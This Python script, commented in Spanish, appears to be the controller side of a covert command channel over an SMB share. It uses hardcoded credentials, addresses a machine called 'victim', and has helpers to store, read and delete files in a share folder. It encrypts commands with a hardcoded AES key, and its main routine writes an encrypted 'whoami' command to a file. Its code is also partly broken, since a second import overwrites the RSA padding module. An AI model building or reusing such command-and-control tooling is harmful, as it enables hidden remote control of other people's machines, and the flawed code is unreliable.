import tempfile, os, subprocess, time, string, random
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from smb.SMBConnection import SMBConnection
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import base64

file_path = "lala/"  # Definir la ruta en el recurso compartido

# Función para cifrar un mensaje con AES
def encrypt_with_symmetric_key(key, plaintext):
    iv = os.urandom(16)  # Generar un IV aleatorio de 16 bytes
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()

    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()

    # Devolver el IV y el texto cifrado en base64
    return base64.b64encode(iv + ciphertext).decode('utf-8')

# Función para descifrar un mensaje con AES
def decrypt_with_symmetric_key(key, ciphertext_base64):
    ciphertext_with_iv = base64.b64decode(ciphertext_base64)
    iv = ciphertext_with_iv[:16]
    ciphertext = ciphertext_with_iv[16:]

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    decryptor = cipher.decryptor()
    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

    return plaintext.decode('utf-8')

def setup_server():
    conn = SMBConnection("smbuser", "smbpass", "server", "victim")
    conn.connect("127.0.0.1", 445)
    return conn

def check_if_file_exists(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    try:
        # Intentar obtener el archivo. Si no existe, lanza una excepción.
        file_attributes = conn.getAttributes(shared_folder, file_path + filename)
        return True  # El archivo existe
    except:
        return False  # El archivo no existe


def delete_file_from_smb(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Intentar borrar el archivo en el recurso compartido
    conn.deleteFiles(shared_folder, file_path + filename)

def write_to_smb(conn, filename, content):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Crear un archivo temporal
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        temp_file.write(content)  # Escribir el contenido en el archivo temporal
        temp_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Subir el archivo al recurso compartido
    with open(temp_filename, 'rb') as temp_file:
        conn.storeFile(shared_folder, file_path + filename, temp_file)  # Usar storeFile para subir

    # Eliminar el archivo temporal
    os.remove(temp_filename)

def read_from_smb(conn, filename):
    shared_folder = "shared"  # Nombre del recurso compartido

    # Crear un archivo temporal para almacenar el archivo descargado
    with tempfile.NamedTemporaryFile(delete=False) as temp_file:
        local_filename = temp_file.name  # Obtener el nombre del archivo temporal

    # Descargar el archivo desde SMB
    with open(local_filename, 'wb') as local_file:
        conn.retrieveFile(shared_folder, file_path + filename, local_file)  # Descargar el archivo desde SMB

    # Leer el archivo descargado
    with open(local_filename, 'r') as f:
        command = f.read()

    # Eliminar el archivo temporal
    os.remove(local_filename)

    return command

def generate_random_password(length=12):
    # Definir los caracteres posibles: letras mayúsculas, minúsculas, dígitos y símbolos
    all_characters = string.ascii_letters + string.digits + string.punctuation

    # Generar la contraseña aleatoria
    password = ''.join(random.choice(all_characters) for _ in range(length))
    return password

def load_public_key(public_key_pem):
    # Asegúrate de que los datos leídos sean en formato bytes
    return serialization.load_pem_public_key(public_key_pem)

# Función para cifrar un mensaje con la clave pública
def encrypt_with_public_key(public_key, message):
    ciphertext = public_key.encrypt(
        message.encode(),  # Codificar el mensaje a bytes
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return ciphertext

def main():
    response = "whoami"
    encrypted_response = encrypt_with_symmetric_key("|vk^3;-8.)&5FI0S".encode('utf-8'), response)

    # Escribir el contenido cifrado en un archivo local
    with open('command.txt', 'w') as f:
        f.write(encrypted_response)


if __name__ == "__main__":
    main()
